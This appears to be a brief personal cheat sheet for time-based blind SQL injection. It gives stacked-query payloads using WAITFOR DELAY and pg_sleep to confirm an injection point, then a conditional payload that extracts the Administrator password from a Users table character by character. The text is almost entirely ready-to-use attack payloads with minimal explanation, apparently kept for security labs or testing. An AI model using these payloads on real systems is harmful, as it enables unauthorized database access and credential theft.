1. Try to run time delay and see the diff
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; if (1=1) SELECT pg_sleep(10)--

2. Try to construct the condition
  '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
